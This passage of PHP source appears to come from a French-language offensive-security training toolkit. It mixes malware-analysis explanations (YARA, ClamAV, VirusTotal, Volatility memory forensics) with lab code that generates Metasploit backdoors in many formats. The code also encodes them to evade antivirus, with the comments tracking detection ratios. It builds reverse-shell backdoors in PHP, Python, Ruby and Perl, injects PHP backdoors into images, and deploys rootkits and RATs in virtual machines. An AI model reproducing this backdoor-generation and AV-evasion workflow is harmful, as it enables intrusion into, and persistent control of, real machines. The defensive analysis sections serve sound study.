Fuzzy hash comparison can tell the percentage similarity between the files. 
Fuzzy hash comparison is a method by which identical files can be identified. 
This can help in determine the variants of the same malware.
			• Submission to online Antivirus scanning services: This will help you determine if the malicious code signatures exist for the suspect file. The signature
name for the specific file provides an excellent way to gain additional information about the file and ca-
pabilities. By visiting the respective antivirus vendor web sites or searching for the signature in search
engines can yield additional details about the suspect file. Such information may help in further investi-
gation and reduce the analysis time of the malware specimen.
			• Examining File Dependencies: 
			Executable loads multiple shared libraries and call api functions to perform certain actions like resolving domain names,
establishing an http connection etc. 
Determining the type of shared library and list of api calls imported by an executable can give an idea on the functionality of the malware.
		Examining ELF File Structure: ELF stands for “Executable and Linkable Format” this is a standard binary file format for Linux systems. 
Examining the ELF file structure can yield wealth of the information including Sections, Symbols and other file metadata information.
		Windows executable load multiple DLL’s (Dynamic Linked Library) and call api functions to perfrom cer-
tains actions like resolving domain names, adding registry value, establishing an http connection etc.
Determining the type of DLL and list of api calls imported by an executable can give an idea on the func-
tionality of the malware.
Dependency Walker and PEview are some of the tools that can be used to inspect the file dependencies.		
			• Disassembling the File: Examining the suspect program in a disassembler allows the investigator to explore the instructions that will be executed by the malware. 
Disassembly can help in tracing the paths that are not usually determined during dynamic analysis.
			IDA Pro/gdb are a popular disassembler that can be used to disassemble a file, it supports multiple file formats.");
	$this->pause();
	$this->article("Static Analysis Features","
Below are the static analysis capabilities:

Determines File Type
Determines File Size
Determines md5 hash
Determines fuzzy hash(ssdeep hash)
Comparison of fuzzy hash with previously submitted samples to determine similar variants
Display ELF header Structure
Dumps ASCII and UNICODE strings
Determines packers using YARA rules
Determines malware capability using YARA rules (ability to run custom YARA rules will be added soon)
Perfoms md5 search on VirusTotal(does not submit samples)
Displays dependencies of the malware (shared objects)
Displays program header structures
Displays section header information
Displays symbol table (both static and dynamic symbols)");
	$this->pause();

	$this->titre("CLAMAV SIGNATURES ");
	$query = "sigtool -i /var/lib/clamav/main.cvd ";
	$this->requette("$query | grep Signatures");
	$this->pause();
	

	$malware_win =new bin4win("$this->dir_tmp/trojan_SilentBanker.exe");
	//$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar"); // No
	$malware_win->file_file2virus2vt();
	$malware_win->win2info(); 
	$this->pause();
	$malware_win->file_file2debug();
	$this->pause();

	$malware_win =new bin4win("$this->dir_tmp/trojan_spyeye.exe");
	//$malware_win->file_file2yara("$this->dir_tools/yara/Spyeye.yar");  // No
	//$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar"); // No
	$malware_win->file_file2virus2vt();
	$malware_win->win2info();
	$this->pause();

	$malware_win =new bin4win("$this->dir_tmp/trojan_shylock.exe");
	//$malware_win->file_file2yara("$this->dir_tools/yara/Shylock.yar"); 	// No
	//$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$malware_win->file_file2virus2vt();
	$malware_win->win2info();
	$this->pause();

	$malware_win =new bin4win("$this->dir_tmp/worm_conficker.exe");
	//$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$malware_win->file_file2virus2vt();
	$malware_win->win2info();
	$this->pause();

	$malware_win =new bin4win("$this->dir_tmp/ProRat.exe");
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");
	$malware_win->file_file2virus2vt();
	$malware_win->win2info();
	$this->pause();
	
	
	$this->titre("YARA RULES");
	$malware_win =new bin4win($this->vmem_trojan_win_spyeye[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/Spyeye.yar"); // OK 
	//$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_trojan_win_darkcomet[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/RAT_DarkComet.yar"); // OK
	$malware_win->file_file2yara("$this->dir_tools/yara/DarkComet2.yar"); // OK
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar"); // OK
	$this->pause();
	$malware_win =new bin4win($this->vmem_trojan_win_zeus[1]);
	$malware_win->file_file2virus4scan2local4clamav(); // No
	$malware_win->file_file2yara("$this->dir_tools/yara/Zeus3.yar");	// OK
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar"); // No
	$this->pause();
	$malware_win =new bin4win($this->vmem_trojan_win_zeus2[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/Zeus3.yar"); // OK
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_worm_win_stuxnet[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/APT_Stuxnet.yar");	// OK
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();	
	

	$backdoor_win_msf2exe_encoded_10 = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_msf2exe_encoded_10.exe","");
	$backdoor_win_msf2exe_encoded_10->backdoor_win_msf2exe_encoded_10();
	$obj_zip = $backdoor_win_msf2exe_encoded_10->file_file2zip4pass("rohff");
	$obj_zip->file_file2virus2vt(); // 00 / 60
	$obj_zip->file_file2yara("$this->dir_tools/yara/malware.yar");
	$obj_zip->file_file2info();
	$obj_zip->file_file2metadata();
	$obj_zip->file_file2virus4scan2local4ssma();
	$obj_zip->file_file2virus4scan2local();
	$this->pause();

	/*

	$malware_win =new bin4win("$this->dir_tools/Malware/nc.exe");
	$malware_win->file_file2virus4scan2local4clamav(); // No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar"); // No
	$malware_win->file_file2virus2vt();	// 31/56
	$this->pause();
	$malware_win =new bin4win($this->vmem_trojan_win_aka[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_trojan_win_coreflood[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_rootkit_win_sality[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_rootkit_win_prolaco[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_rootkit_win_tigger[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	
	//$malware_win =new bin4win($this->vmem_rootkit_win_hackerDefender[1]);
	//$malware_win->file_file2virus4scan2local4clamav();
	//$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");
	//$this->pause();
	
	$malware_win =new bin4win($this->vmem_rootkit_win_laqma[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_worm_win_cridex[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_trojan_win_blackEnergy[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/APT_Blackenergy.yar");	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/blackenergy2.yar");	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_trojan_win_Shylock[1]);
	$malware_win->file_file2virus4scan2local4clamav();	// No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");	// No
	$this->pause();
	$malware_win =new bin4win($this->vmem_trojan_win_silentbanker[1]);
	$malware_win->file_file2virus4scan2local4clamav();  // No
	$malware_win->file_file2yara("$this->dir_tools/yara/malware.yar");  // No
	$this->pause();
	*/
	
	
	
	
	}
	
	
	public function poc4malware4bypass4hips(){

	$this->gtitre("Bypass HIPS under Windows");
/*	
	$this->requette("msfvenom --help-formats");
	$this->pause();
	

	$this->titre("Langage around SHELL WINDOWS");
	
	$backdoor_win_msf2dll = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_msf2dll.dll","");
	$backdoor_win_msf2dll->backdoor_win_msf2dll();
	$this->pause(); // 52 / 66
	
	$backdoor_win_msf2msi = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_msf2msi.msi","");
	$backdoor_win_msf2msi->backdoor_win_msf2msi();
	$this->pause(); // 27 / 60
	
	// ##########################  BAT   #######################################################
	$backdoor_win_bat = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_bat.bat","");
	$backdoor_win_bat->backdoor_win_bat(); // 20 / 59
	$this->pause();

	
	$backdoor_msf2https2exe = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_msf2exe_https.exe","");
	$backdoor_msf2https2exe->backdoor_win_msf2exe_https();
	$this->pause(); // 21 / 67
	
	
	$malware_win = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_msf2c2rev.exe", "");
	$malware_path_exe = $malware_win->backdoor_win_msf2c2rev(); 
	$this->pause(); // 17 / 67
	

	// ##########################  VBS   #######################################################
	$backdoor_com_vbs = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_msf2vbs.vbs","");
	$backdoor_com_vbs->backdoor_win_msf2vbs(); // 27 / 59
	$this->pause();

	
	// ##########################  VBA   #######################################################
	$backdoor_com_vba = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_msf2vba.vba","");
	$backdoor_com_vba->backdoor_win_msf2vba(); // 03 / 59
	$this->pause();
	// ##########################  ASP   #######################################################
	$backdoor_com_asp = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_msf2asp.asp","");
	$backdoor_com_asp->backdoor_win_msf2asp(); // 11 / 59
	$this->pause();
	// ##########################  ASPX   #######################################################
	$backdoor_com_aspx = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_msf2aspx.aspx","");
	$backdoor_com_aspx->backdoor_win_msf2aspx(); // 10 / 59
	$this->pause();
	// ##########################  PS1   #######################################################
	$backdoor_win_ps1 = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_msf2ps1.ps1","");
	$backdoor_win_ps1->backdoor_win_ps1(); // 02 / 60
	$this->pause();
	
	
	$malware_win = new trojan4win("win7x86",$this->win7x86,8001,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/trojan_win_c2exe.exe", "");
	$malware_win->trojan_win_c2exe();
	$this->pause(); // 16 / 56
	
	$malware_win = new backdoor4win("win7x86",$this->win7x86,8001,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_c2exe.exe", "");
	$malware_win->backdoor_win_c2exe();
	$this->pause(); // 09 / 57
	

	$this->titre("Langage around JAVA");
	// ##################################### JAR ########################################################
	$backdoor_com_jar = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_com_jar.jar","");
	$backdoor_com_jar->backdoor_com_jar($this->prof, $this->proxy_port_burp)->backdoor_win_jar2exe($this->prof, $this->proxy_port_burp);
	$this->pause(); //  06 / 67
	// ##################################### JSP ##########################################################
	$backdoor_com_jsp = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_msf2jsp.jsp","");
	$backdoor_com_jsp->backdoor_win_msf2jsp($this->prof, $this->proxy_port_burp); 
	$this->pause();   // 04 / 60
	// ##################################### WAR ########################################################
	$backdoor_com_war = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_msf2war.war","");
	$backdoor_com_war->backdoor_win_msf2war($this->prof, $this->proxy_port_burp); 
	$this->pause();   // 04 / 60
	// ##################################################################################################
	
*/


	$this->titre("Langage around PYTHON");
	// ##########################  PYTHON   #######################################################
	
	$backdoor_python_simple = new backdoor4win("xp3",$this->xp3,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_win_python_simple.py","");
	$backdoor_python_simple->backdoor_com_python_netcat($this->prof, $this->proxy_port_burp)->backdoor_win_py2exe4pyinstaller();
	$this->pause(); // 01 / 59, 02 / 67
	// ##################################################################################################
	
			
	$this->titre("Langage around PHP");
	// ##########################  PHP   #######################################################
	$backdoor_com_php_netcat = new backdoor4win("xp3",$this->xp3,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_com_php_netcat.php","");
	$backdoor_com_php_netcat->backdoor_com_php_netcat($this->prof, $this->proxy_port_burp)->backdoor_win_php2exe_convert4bamcompile(); // 3 / 54
	$this->pause(); // 03 / 59,02 / 67
	$backdoor_com_php_simple = new backdoor4win("xp3",$this->xp3,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_com_php_simple.php","");
	$backdoor_com_php_simple->backdoor_com_php_simple($this->prof, $this->proxy_port_burp)->backdoor_win_php2exe_convert4bamcompile(); // 1 / 54
	$this->pause(); // 01 / 59,02 / 67
	$backdoor_com_php_base64 = new backdoor4win("xp3",$this->xp3,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_com_php_base64.php","");
	$backdoor_com_php_base64->backdoor_com_php_base64($this->prof, $this->proxy_port_burp)->backdoor_win_php2exe_convert4bamcompile();  // 3 / 54
	$this->pause();   // 01 / 59,02 / 67
	$backdoor_com_php_simple = new backdoor4win("xp3",$this->xp3,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_com_php_simple_reverse.php","");
	$backdoor_com_php_simple->backdoor_com_php_simple_reverse($this->prof, $this->proxy_port_burp)->backdoor_win_php2exe_convert4bamcompile();  // 2 / 54
	$this->pause(); // 01 / 59,02 / 67
	// ##########################  PHAR   #######################################################
	$this->todo("add fichier .phar  php dist/SemanticScuttle-0.98.X.phar");
	$this->pause();
	// ##################################################################################################
	

	
	$this->titre("Langage around RUBY");
	// ##########################  RUBY   #######################################################

	$backdoor = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_com_ruby.rb","");
	$backdoor->backdoor_com_ruby($backdoor->attacker_ip,$backdoor->attacker_port);
	$this->pause(); // 00 / 59,
	$backdoor->backdoor_win_ruby2exe();
	$this->pause(); // 01 / 67
	// ##################################################################################################
	
	
	
	$this->titre("Langage around PERL");
	// ##########################  PERL   #######################################################
	$backdoor_com_perl_simple = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_com_perl_simple.pl","");
	$backdoor_com_perl_simple->backdoor_com_perl_simple($this->prof, $this->proxy_port_burp)->backdoor_win_perl2exe();
	$this->pause(); // 00 / 59,00 / 67
	// ##################################################################################################
	
	
	
	
	
	$malware_win = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_meterpreter_reverse_tcp.exe", "");
	$malware_win->backdoor_win_av4proof();
	$this->pause(); // 03 / 67
	
	$backdoor_linux = new backdoor4linux("localhost",$this->prof,8080,$this->prof, 31337,"$this->dir_tmp/backdoor_linux_c2passwd.elf","");
	$backdoor_linux->backdoor_linux_c2passwd();
	$this->pause(); // 00/59
	
	$this->poc4malware4backdoor4langage();
	}
	
	

	
	public function poc4malware4backdoor4langage(){
		$this->gtitre("Using Langage for Backdooring");
	$this->ssTitre("Inject Into IMG");
	$this->net("http://www.sonelgaz.dz/Media/upload/image/1527689738_boum2.jpg");
	//$this->requette("cp -v $this->dir_tools/backdoor/expo.jpg $this->dir_tmp/expo.jpg");
	$img_file = new inject4linux("localhost",$this->prof,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_com_php2img.jpg", "","$this->dir_tmp/photo.jpg");
	// requette("wget --user-agent='$this->user_agent' -c http://www.mdn.dz/images/MDN.gif -O $img_file ");
	$img_file->backdoor_com_php2any(); // 00 / 59
	$this->pause();
	/*
	$this->ssTitre("Inject Into .DOC");
	$file_doc = "$this->dir_tmp/file_doc.doc";
	$this->requette("echo 'salut tout le monde' > $file_doc");
	$this->requette("soffice --writer $file_doc");
	$this->pause();
	$doc_file = new inject4linux("localhost",$this->prof,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_com_php2doc.doc", "",$file_doc);
	$doc_file->backdoor_com_php2any(); // 0 / 57
	$this->pause();

	
	$this->ssTitre("Inject Into Video File");
	$file_vdo = "$this->dir_tmp/file_vdo.ogv";
	$this->cmd($this->prof, "recordmydesktop -x400 -y100 --width 1050 --height 850 --no-sound -o $file_vdo");
	$this->pause();
	$vdo_file = new inject4linux("localhost",$this->prof,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_com_php2vdo.ogv","",$file_vdo);
	$vdo_file->backdoor_com_php2any(); // 0 / 57
	$this->requette("vlc $vdo_file->file_path" );
	$this->todo("faire la meme chose pour JSP / ASP ");
	 // 0 / 57
	$this->pause(); // OK
	*/


	}
	
	
	
	
	
	

	public function poc4malware4bypass4hids(){
	$this->gtitre("HIDS");
	$this->titre("Code Injection");

	$this->poc4malware4backdoor_injected_into_pid();
	$this->question("les Malwares de nos jours utilisent-ils les Injections de code dans la memoire d'un autre processus");
	$this->poc4malware4backdoor_injected_into_pid_exemple();
	$this->pause();
	$this->article("En resume", "La sécurité a ses limites, Nous venons de le prouver encore une fois, à partir d’éléments simples.
	aussi important de dire que Rejeter d’un bloc tout un plan fonctionnel de la sécurité que représentent les technologies de détection et de prévention des intrusions, sous le seul prétexte qu’il
	est possible de les contourner, est une erreur grave au même titre que de leur faire une confiance aveugle.");
	}
	
	// ######################################################################################
	


	
	
	
	

	

	public function poc4malware4rootkit(){
	$this->ssTitre(__FUNCTION__);
	$this->titre("l'interet de demarrer une dll au lancement de la machine");
		
	/*
	$this->poc4malware4rootkit4linux_ld_preload();$this->pause(); // OK
    $linux_user = new rootkit4linux("","","","","","","");
	$linux_user->rootkit4linux_intro();
	$linux_user->rootkit4linux_fonctionnement();
	$this->pause();
	$this->img("$this->dir_img/bof/linuxFlexibleAddressSpaceLayout.png");
	$this->img("$this->dir_img/rootkit/rootkit_userland_kerneland.png");
	$this->img("$this->dir_img/rootkit/kernel_attack_surface.png");
	$this->img("$this->dir_img/rootkit/user_vs_kernel_win.png");
	$this->img("$this->dir_img/bof/linuxperftools.png");	
	$this->pause();
	*/
	$this->gtitre("USERLAND Rootkit");
	$linux_user_azzazel = new rootkit4linux("ub14041",$this->ub14041,61040, $this->prof, "LinuxUbuntu14041x86", "$this->dir_tmp/rootkit4linux_user_azazel_ub1404_3.13.0-32-generic.vmem","");
	$linux_user_azzazel->rootkit4linux_user_azazel();
	$this->pause();
	
	$linux_user_hackerDefender = new rootkit4win("xp3",$this->win7x86,80,$this->win7x86, "WinXPSP3x86", "$this->dir_tmp/rootkit4win_user_hackerDefender.vmem","forensics");
	$linux_user_hackerDefender->rootkit4win_user_hackerDefender();
	$this->pause();
	
	//$linux_user_hackerDefender = new rootkit4win("win7x86",$this->win7x86,80, $this->win7x86, "WinXPSP3", "$this->dir_tmp/rootkit4win_user_hackerDefender_m6i5.vmem","forensics");
	//$linux_user_hackerDefender->rootkit4win_user_hackerDefender();
	//$this->pause();
	
	$linux_user_jynx2 = new rootkit4linux("ub14041",$this->ub14041,5555, $this->prof, "LinuxUbuntu14041x86", "$this->dir_tmp/rootkit4linux_user_jynx2_ub1404_3.13.0-32-generic.vmem","");
	$linux_user_jynx2->rootkit4linux_user_jynx2();$this->pause();
		
	$this->poc4malware4rootkit4win_hook_dll_32_exemple();$this->pause();
	
	$this->question("quel est l'interet de charger un module au noyau ?");
	
	$this->gtitre("Kernel Rootkit");
	$this->net("https://github.com/milabs/kmod_hooking");
	$this->net("https://github.com/fi01/backdoor_mmap_tools");

	$linux_kernel_kbeastv1 = new rootkit4linux("ub10040",$this->ub10040x86,13377, $this->prof, "LinuxUbuntu10040x86", "$this->dir_tmp/rootkit4linux_kernel_kbeastv1_ub10040_2.6.32-21-generic.vmem", "");
	$linux_kernel_kbeastv1->rootkit4linux_kernel_kbeastv1();
	$this->pause();
	
	//$linux_kernel_avgcoder = new rootkit4linux("ub10040",$this->ub10040x86,5544, $this->prof, "LinuxUbuntu10040x86", "$this->dir_tmp/rootkit4linux_kernel_avgcoder_ub10040_2.6.32-21-generic.vmem", "");
	//$linux_kernel_avgcoder->rootkit4linux_kernel_avgcoder();$this->pause();
	
	//$this->poc4malware4rootkit4win_ssdt_32_exemple();$this->pause();
	
	}
	
	
	
	
	public function poc4malware4trojan4win(){
	$this->ssTitre(__FUNCTION__);

	$this->titre("Remote Administration Tools - RAT");
	$this->net("http://logicieldepiratage.blogspot.com/2011/02/les-top-rat-remote-administration-tools.html");
	$this->pause();
	$this->ssTitre("RAT (Remote Administration Tool)");
	$this->article("RAT", "Legal: l’utilisation d’un rat est légal dans un seul cas: lorsque une personne ou société donne son accord, la personne pourra contrôler totalement ou partiellement leur machine a distance.
llegal: Il est illégal quand il est installé à l’issu de l’utilisateur, ce dernier n’est pas au courant que l’application(serveur) installé dans son pc qui permet de le contrôler totalement a distance");
	$this->pause();

	$win7x86 = new vm("win7x86");
	$win7x86->vm2upload("$this->dir_tools/Malware/ProRat_v1.9_password-pro.zip","$this->vm_tmp_win\ProRat_v1.9_password-pro.zip");
	$win7x86->vm2upload("$this->dir_tools/Malware/MoSucker_3.0b.zip","$this->vm_tmp_win\MoSucker_3.0b.zip");
	$win7x86->vm2upload("$this->dir_tools/Malware/trojan_Poison_ivy_2.3.2.exe","$this->vm_tmp_win\\trojan_Poison_ivy_2.3.2.exe");
	
	
	$this->cmd($this->win7x86,"$this->vm_tmp_win\ProRat_v1.9_password-pro\ProRat.exe");
	$this->cmd($this->win7x86,"$this->vm_tmp_win\MoSucker_3.0b\MoSucker.exe");
	$this->cmd($this->win7x86,"$this->vm_tmp_win\MoSucker_3.0b\\trojan_Poison_ivy_2.3.2.exe");
	$this->pause();
	}
	
	

	

	public function poc4malware4trojan4linux() {
	    $this->gtitre(__FUNCTION__);
	
	    $target_vmx_name = "ub14041";
	    $target_ip = "10.60.10.128";
	    $target_port = "";
	    $attacker_ip = "";
	    $attacker_port = "2323";
	    $file_path_output = "$this->dir_tmp/victime_backdoor.elf";
	    $snapshot = "";	    
	    $malware = new trojan4linux($target_vmx_name, $target_ip, $target_port, $attacker_ip, $attacker_port, $file_path_output, $snapshot);
	   // $malware->trojan4linux_ping();
	    
	
	    
	    
	    $target_vmx_name = "ub14041";
	    $target_ip = "10.60.10.128";
	    $target_port = "";
	    $attacker_ip = "";
	    $attacker_port = "8000";
	    $file_path_output = "$this->dir_tmp/evilshell.elf";
	    $snapshot = "";	    
	    $malware = new trojan4linux($target_vmx_name, $target_ip, $target_port, $attacker_ip, $attacker_port, $file_path_output, $snapshot);
	    $malware->trojan4linux_hide_process();
	    
	    
	    $this->requette("grep -i ICMP /etc/snort/rules/*.rules | egrep -i \"(backdoor|trojan|malware|worm)\" | tee $this->dir_tmp/malware_use_icmp.txt" );
	    $this->pause();
	    
	
	}
	
	
	

	function poc4malware4backdoor4win_persistance_32_exemple() {
	$this->ssTitre("Windows Persistance on 32Bits Exemple");
	$filter = "";
	
	
	foreach($this->vmem_persistance_win_mz as $vmem_type_win_all)
	//foreach ($vmem_type_win_all as $vmem_type_win)
	{
	list($titre, $vmem, $profile) = $vmem_type_win_all;
	$this->chapitre($titre);
	$vmem_for = new for4win($vmem, $profile);
	$vmem_for->for4win_Malware_persistence_mz("");
	$this->pause();
	}
	
	
	foreach($this->vmem_persistance_win_dll as $vmem_persistance_win_dll)
	{
	list($titre, $vmem, $profile) = $vmem_persistance_win_dll;
	$this->chapitre("Persistance DLL - $titre");
	$vmem_for = new for4win($vmem, $profile);
	$vmem_for->for4win_Malware_persistence_mz("");
	$this->pause();
	}
	
	/*
	 * chapitre("ZEUS Trojan");
	 * $vmem = "$this->dir_tools/memory/WinXPSP2x86_Trojan_Zeus.vmem";
	 * $profile = "WinXPSP2x86";
	 * win_run_start($rep_path,$vmem,$profile);
	 *
	 * chapitre("Trojan Bob");
	 * $vmem = "$this->dir_tools/memory/Bob.vmem";
	 * $profile = "WinXPSP2x86";
	 * win_run_start($rep_path,$vmem,$profile);
	 *
	 * chapitre("DARKCOMET Trojan");
	 * $vmem = "$this->dir_tools/memory/Win7SP1x86_Trojan_DarkComet_RAT.vmem";
	 * $profile = "Win7SP1x86";
	 * win_run_start($rep_path,$vmem,$profile);
	 *
	 *
	 * $vmem = "$this->dir_tools/memory/WinXPSP2x86_0zapftis.vmem";
	 * $profile = "WinXPSP2x86";
	 * win_run_start($rep_path,$vmem,$profile);
	 * win_dlldump_name_and_analysis($rep_path,$vmem, $profile, "mfc42ul.dll");note("it was injected in several exec");win_process_graphic($rep_path,$vmem, $profile);pause();
	 * pause();
	 *
	 * chapitre("Win7SP1x64_IBM-PC-20140921-smail");
	 * $vmem = "$this->dir_tools/memory/Win7SP1x64_IBM-PC-20140921-smail.vmem";
	 * $profile = "Win7SP1x64";
	 * win_run_start($rep_path,$vmem,$profile);
	 *
	 *
	 * chapitre("Win2008SP1x86");
	 * $vmem = "$this->dir_tools/memory/Win2008SP1x86.vmem";
	 * $profile = "Win2008SP1x86";
	 * win_run_start($rep_path,$vmem,$profile);
	 *
	 * pause();
	 */
	}
	
	
	
	
	
	
	
	
	
	function poc4malware4rootkit4win_hook_dll_32_exemple() {
	// Loaded into the process with LoadLibrary
	$this->titre("Windows Hooking DLL on 32Bits Exemple");
	
	// prendre celle de stuxnet
	// black energy 2 pour le kernel
	
	$this->gtitre("Hooking Mode User - Syscall");
	$filter = "";
	foreach($this->vmem_hook_usermode_syscall as $vmem_type) {
	list($titre, $vmem, $profile) = $vmem_type;
	$this->gtitre($titre);$this->pause();
	$vmem_for = new for4win($vmem, $profile);
	$vmem_for->for4win_Malware_apihooks($filter);
	$this->pause();
	}
	
	$this->gtitre("Hooking Mode User - GOT");
	$filter = "";
	foreach($this->vmem_hook_usermode_got as $vmem_type) {
	list($titre, $vmem, $profile) = $vmem_type;
	$this->gtitre($titre);
	$vmem_for = new for4win($vmem, $profile);
	$vmem_for->for4win_Malware_apihooks("");
	$this->pause();
	}
	
	$this->gtitre("Hooking Mode User - Trampoline");
	$filter = "";
	foreach($this->vmem_hook_usermode_Trampoline as $vmem_type) {
	list($titre, $vmem, $profile) = $vmem_type;
	$this->gtitre($titre);$this->pause();
	$vmem_for = new for4win($vmem, $profile);
	$vmem_for->for4win_Malware_apihooks("");
	$this->pause();
	}
	
	$this->gtitre("Hooking Mode Kernel - Trampoline");
	$filter = "";
	foreach($this->vmem_hook_kernelmode_Trampoline as $vmem_type) {
	list($titre, $vmem, $profile) = $vmem_type;
	$this->gtitre($titre);$this->pause();
	$vmem_for = new for4win($vmem, $profile);
	$vmem_for->for4win_Malware_apihooks("");
	$this->pause();
	}
	}
	
	
	
	function poc4malware4rootkit4win_ssdt_32_exemple() {
	$this->ssTitre(__FUNCTION__);
	$filter = "";
	
	foreach($this->vmem_ssdt as $vmem_type_win) {
	list($titre, $vmem, $profile) = $vmem_type_win;
	$this->chapitre($titre);
	$vmem_for = new for4win($vmem, $profile);
	$vmem_for->for4win_Malware_injection_mz("");
	}
	}
	
	
	public function poc4malware4analysis(){
	    $this->article("Types of Malware Analysis","
In order to understand the characteristics of the malware three types of analysis can be
performed they are:
	- Static Analysis
	- Dynamic Analysis
	- Memory Analysis
In most cases static and dynamic analysis will yield sufficient results however Memory
analysis helps in determining hidden artifacts, rootkit and stealth malware capabilities.");
	}
	
	
	public function poc4malware4sandbox_intro(){
	    $this->article("Memory Analysis","
Memory Analysis also referred to as Memory Forensics is the analysis of the memory image taken from the running computer.
Analyzing the memory after executing the malware sample provides post-mortem perspective and helps in extracting forensics artifacts from a computer's memory like:
	- running processes
	- network connections
	- loaded modules
	- code injections
	- Hooking and Rootkit capabilities.
	- API Hooking");
	    $this->pause();
	    $this->article("Memory Analysis features","
Performs post-mortem analysis by performing memory analysis using Volatility framework.
This feature should help in detecting stealthy rootkits and malwares performing Anti-Forensic tricks. Below are the memory analysis features:
	        
option to perform verbose memory forensics (slow)
Process Listing (using different methods)
Process tree listing
Process listing with process arguments
Displays thread associated with each process
Dispays Network connections (TCP and UDP)
Displays Interface Information
Displays processes running with RAW sockets
Displays shared libaries associated with the processes (using different methods)
Displays kernel modules
Dislays kernel modules hidden from module list but present in SYSFS
Displays Kernel modules hidden from both module list and SYSFS
Displays files opened within kernel
Displays processes sharing credential structures
Checks for keyboard notifier hooks
Checks for TTY hooks
Checks for system call table modification
Displays BASH history
Checks for modified file operation structures
Checks hooked network operation function structures
Checks netfilter hooks
